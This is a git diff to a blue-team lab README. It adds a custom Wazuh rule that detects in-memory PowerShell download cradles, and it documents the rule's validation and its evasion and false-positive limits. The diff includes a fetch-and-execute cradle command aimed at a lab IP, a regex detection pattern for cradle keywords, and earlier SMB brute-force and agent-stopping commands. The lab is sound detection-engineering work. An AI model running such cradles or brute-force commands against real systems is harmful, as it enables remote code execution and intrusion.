@@ -1,9 +1,10 @@
-# Wazuh Detection Engineering Lab — AD Brute-Force Detection & Fleet Health
+# Wazuh Detection Engineering Lab — AD Brute-Force, Custom Rule Authoring & Fleet Health
 
 A hands-on blue-team exercise: generate well-known, benign attacker activity against a
 self-owned, instrumented Windows Server 2022 domain controller, then work the Wazuh SIEM
 from the analyst side to document detection coverage — which rules fire, their rule IDs,
-and how they map to MITRE ATT&CK — followed by an agent-health / fleet-reporting exercise.
+and how they map to MITRE ATT&CK — including a **custom-authored detection rule** on top of
+the built-in ruleset, followed by an agent-health / fleet-reporting exercise.
 
 All activity was performed against isolated VirtualBox VMs I own and control.
 
@@ -54,6 +55,7 @@ target — reflected in the fleet-health numbers below.
 | 1 | TCP port/service scan | `nmap -sS -p- 10.0.2.10` | T1046 |
 | 2 | SMB failed-auth burst | `nxc smb 10.0.2.10 -u Administrator -p wrong1..wrongN` | T1110 |
 | 3 | Agent service stop | `Stop-Service -Name Wazuh` (on the DC) | T1562.001 |
+| 4 | PowerShell download cradle | `IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.5/x.ps1')` (on the DC) | T1059.001 |
 
 ---
 
@@ -63,6 +65,7 @@ target — reflected in the fleet-health numbers below.
 |---|---|---|---|---|---|
 | Single failed logon | 4625 | **60122** | Logon failure – unknown user or bad password | 5 | T1078 / T1531 |
 | Brute force (composite) | 4625 ×N | **60204** | Multiple Windows logon failures | 10 | **T1110** (Brute Force / Credential Access) |
+| PowerShell download cradle | Sysmon 1 | **100100** *(custom)* | Suspicious PowerShell download cradle executed | 12 | **T1059.001** (Command and Scripting Interpreter: PowerShell) |
 
 **Key finding — atomic vs. composite detection.** The individual failed logons matched the
 atomic rule **60122** (level 5), which Wazuh tags as Valid Accounts (T1078/T1531). Once
@@ -84,6 +87,56 @@ rule.mitre.tactic: Credential Access
 agent.name:       WIN-S0ESS5L5DIC
 data.win.eventdata.ipAddress: 10.0.2.5   (Kali)
 ```
+
+### Custom Detection — PowerShell Download Cradle (T1059.001)
+
+Beyond the built-in ruleset, authored a custom Wazuh rule to detect in-memory PowerShell
+download cradles — the classic `IEX (New-Object Net.WebClient).DownloadString(...)` pattern
+used to pull and execute a remote payload directly in memory without writing to disk.
+
+Because the technique is **fileless**, hash- and file-based detection miss it entirely — the
+detection has to happen at the command-line level. Sysmon **Event ID 1 (Process Creation)**
+captures the full command line of the spawned `powershell.exe` process, so the rule matches
+against `win.eventdata.commandLine`.
+
+**Rule (`local_rules.xml`, ID 100100):**
+
+```xml
+<group name="local,sysmon,">
+  <rule id="100100" level="12">
+    <if_group>sysmon_event1</if_group>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(DownloadString|Net\.WebClient|IEX|Invoke-Expression)</field>
+    <description>Suspicious PowerShell download cradle executed</description>
+    <mitre><id>T1059.001</id></mitre>
+  </rule>
+</group>
+```
+
+- **ID 100100** — Wazuh reserves the 100000+ range for user-defined rules, so custom rules
+  survive ruleset updates without colliding with the built-in set.
+- **`if_group>sysmon_event1`** — builds on Wazuh's base Sysmon process-creation group rather
+  than re-matching raw events from scratch.
+- **level 12** — high severity, consistent with an active code-execution attempt.
+- **PCRE2, case-insensitive `(?i)`** — matches the cradle's tell-tale tokens. `IEX` and
+  `Invoke-Expression` are both listed so an alias swap doesn't slip past the match.
+
+**Validation.** Executed a benign download cradle on the DC and confirmed rule 100100 fired
+at level 12, then pivoted from the Wazuh alert to the raw Sysmon EID 1 event to confirm the
+match landed on the `commandLine` field — alert → raw telemetry, not just alert-reading.
+
+**Known limitations (documented, not tuned away).** This is a keyword match on the command
+line and is deliberately scoped to the *unobfuscated* cradle:
+
+- **Evasion.** Base64 / `-EncodedCommand`, string concatenation, and other obfuscation bypass
+  the regex — the decoded intent never appears in the raw command line. Catching those
+  requires **PowerShell Script Block Logging (Event ID 4104)**, which logs the deobfuscated
+  block. That's the complementary source I'd pair with this rule to close the gap.
+- **False positives.** Legitimate admin tooling and installers use `Net.WebClient` and
+  `Invoke-Expression`, so a flat keyword match will fire on benign activity. Hardening
+  direction is parent-process scoping and known-good path exclusions.
+
+Recorded with its coverage boundaries rather than presented as production-ready — same
+posture as the network-scan gap below.
 
 ### Coverage gap — network scanning (documented, not a pass)
 
@@ -133,6 +186,9 @@ the fleet status degrade, then recover.
 
 - Generated known adversary behavior and validated SIEM detection coverage end-to-end
 - Distinguished atomic (60122) vs. frequency-based composite (60204) detection logic
+- **Authored a custom Wazuh detection rule (100100, T1059.001)** on the Sysmon EID 1
+  process-creation group, validated it fired, and documented its evasion (`-EncodedCommand`
+  / 4104) and false-positive limitations rather than overclaiming it as production-ready
 - Mapped detections to MITRE ATT&CK from raw alert JSON, and caught a level-12 Sysmon
   false-positive (svchost / T1055) that was unrelated to the attack — triage judgment,
   not just alert-reading
@@ -149,5 +205,9 @@ the fleet status degrade, then recover.
 - `nxc smb <ip> -u Administrator` authenticates NTLM against the local account → 4625 only;
   4771/4776 require targeting a **domain** account.
 - Raw nmap scans do not alert out of the box — Sysmon NetworkConnect filtering suppresses them.
+- Rule 100100 matches on `win.eventdata.commandLine`; confirm Sysmon EID 1 command-line
+  capture is enabled in your Sysmon config or the field will be empty and the rule won't fire.
+- Obfuscated cradles (`-EncodedCommand`, base64) will **not** match 100100 by design — add
+  PowerShell Script Block Logging (Event ID 4104) to cover the deobfuscated block.
 - Confirm the agent service name with `Get-Service *wazuh*` before stopping it.
 - All lab credentials must be scrubbed from screenshots before publishing.
